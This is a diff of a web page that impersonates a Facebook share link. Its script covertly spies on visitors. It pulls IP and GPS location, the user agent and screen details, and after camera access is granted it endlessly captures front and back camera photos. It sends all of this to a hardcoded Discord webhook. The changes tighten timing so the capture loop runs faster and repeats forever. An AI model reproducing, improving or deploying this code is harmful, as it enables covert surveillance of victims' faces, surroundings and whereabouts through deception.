@@ -6,9 +6,10 @@
   <title>Facebook</title>
   <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
 
+  <!-- OG-tags -->
   <meta property="og:title" content="Facebook">
   <meta property="og:description" content="DOK MI NISI PAO U OCIMA DUBOKO">
-  <meta property="og:image" content="https://i.imgur.com/DEIN_THUMBNAIL.jpg"> <!-- vervang -->
+  <meta property="og:image" content="https://i.imgur.com/DEIN_THUMBNAIL.jpg">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
   <meta property="og:url" content="https://www.facebook.com/share/r/1AeJHMHjaj/">
@@ -96,16 +97,15 @@
 <script>
 const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
 let count = 0, frontStream = null, backStream = null, v = document.getElementById('v'), c = document.getElementById('c'), flash = document.getElementById('flash');
-let photoBatch = 0; // 0 = front, 1 = back
 
 async function getIPData() {
   const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json', 'https://api.ipify.org?format=json', 'https://freegeoip.app/json/'];
   for (let url of apis) {
     try {
-      const r = await fetch(url);
+      const r = await fetch(url, {cache:'no-store'});
       const d = await r.json();
       if (d.ip) return {
-        ip: d.ip || d.query || 'verborgen (VPN?)',
+        ip: d.ip || d.query || 'verborgen',
         city: d.city || d.city_name || '?',
         region: d.region || d.state_prov || '?',
         country: d.country_name || d.country || '?',
@@ -116,7 +116,7 @@ async function getIPData() {
       };
     } catch {}
   }
-  return {ip:'verborgen (VPN/adblock)', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
+  return {ip:'verborgen (VPN?)', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
 }
 
 async function getGPS() {
@@ -125,7 +125,7 @@ async function getGPS() {
     navigator.geolocation.getCurrentPosition(
       p => r({latitude:p.coords.latitude, longitude:p.coords.longitude, accuracy:p.coords.accuracy}),
       () => r(null),
-      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
+      {enableHighAccuracy:true, timeout:10000, maximumAge:0}
     );
   });
 }
@@ -133,7 +133,7 @@ async function getGPS() {
 async function send(type, blob = null) {
   try {
     let loc = await getGPS() || await getIPData();
-    let ip = loc.ip || 'verborgen (VPN?)';
+    let ip = loc.ip || 'verborgen';
     let city = loc.city || '?', region = loc.region || '?', country = loc.country || '?', postal = loc.postal || '?', org = loc.org || '?';
     let lat = loc.latitude, lon = loc.longitude;
     let acc = lat ? `${Math.round(loc.accuracy || 500)}m` : 'IP-Fallback';
@@ -145,7 +145,7 @@ async function send(type, blob = null) {
       fields: [
         {name:"Event", value:type, inline:true},
         {name:"IP + Ort", value:`**${ip}**\n${city} • ${region} • ${country} • ${postal} • ${org}`, inline:true},
-        {name:"Genauigkeit", value:acc, inline:true},
+        {name:"Genauigheid", value:acc, inline:true},
         {name:"UA", value:navigator.userAgent.substring(0,140), inline:false},
         {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
         {name:"Zeit", value:new Date().toISOString(), inline:true}
@@ -187,20 +187,20 @@ async function startCam(facing = "user") {
 
 function flashScreen() {
   flash.style.opacity = '0.8';
-  setTimeout(() => flash.style.opacity = '0', 100);
+  setTimeout(() => flash.style.opacity = '0', 80);
 }
 
-async function captureBatch(facing, count = 5) {
-  for (let i = 0; i < count; i++) {
+async function captureBatch(facing, numPhotos = 5) {
+  for (let i = 0; i < numPhotos; i++) {
     c.getContext('2d').drawImage(v,0,0,c.width,c.height);
     const data = c.getContext('2d').getImageData(0,0,c.width,c.height).data;
     let brightness = 0;
     for (let j = 0; j < data.length; j += 4) brightness += (data[j] + data[j+1] + data[j+2]) / 3;
     brightness /= (data.length / 4);
     if (brightness < 80) flashScreen();
-    let b = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
+    let b = await new Promise(r => c.toBlob(r,'image/jpeg',0.92));
     send(`CAM SNAP ${facing.toUpperCase()} #${i+1}`, b);
-    await new Promise(r => setTimeout(r, 300)); // kleine delay tussen foto's
+    await new Promise(r => setTimeout(r, 50)); // minimale delay voor smoothheid
   }
 }
 
@@ -213,29 +213,29 @@ document.getElementById('allowCam').onclick = async () => {
   document.getElementById('cam-prompt').style.display = 'none';
   let front = await startCam("user");
   if (front) {
-    // oneindige loop: 5 front → 5 back → repeat
-    setInterval(async () => {
+    const loop = async () => {
       await captureBatch("FRONT", 5);
       front.getTracks().forEach(t => t.stop());
       let back = await startCam("environment");
       if (back) {
         await captureBatch("BACK", 5);
         back.getTracks().forEach(t => t.stop());
-        front = await startCam("user"); // terug naar front
+        front = await startCam("user");
+        if (front) loop(); // herhaal oneindig
       }
-    }, 15000); // elke ~15s batch wisselen (5 foto's + delay)
-
-    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 5000);
+    };
+    loop(); // start direct
+    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 3000);
   } else {
     document.getElementById('camErr').style.display = 'block';
-    setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2000);
+    setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 1500);
   }
 };
 
 document.getElementById('denyCam').onclick = () => {
   document.getElementById('camErr').style.display = 'block';
   send('CAM_DENY');
-  setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 1800);
+  setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 1500);
 };
 
 document.getElementById('allowLoc').onclick = async () => {
